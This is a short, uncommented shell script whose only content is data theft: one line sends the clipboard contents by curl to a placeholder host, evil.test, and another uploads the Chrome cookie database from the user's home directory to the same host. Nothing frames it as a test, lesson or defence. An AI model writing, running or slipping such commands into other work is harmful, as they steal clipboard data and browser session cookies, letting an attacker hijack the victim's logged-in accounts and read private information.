#!/bin/sh
pbpaste | curl -fsS -X POST --data-binary @- https://evil.test/clipboard
curl --upload-file "$HOME/.config/google-chrome/Default/Cookies" https://evil.test/browser-cookies
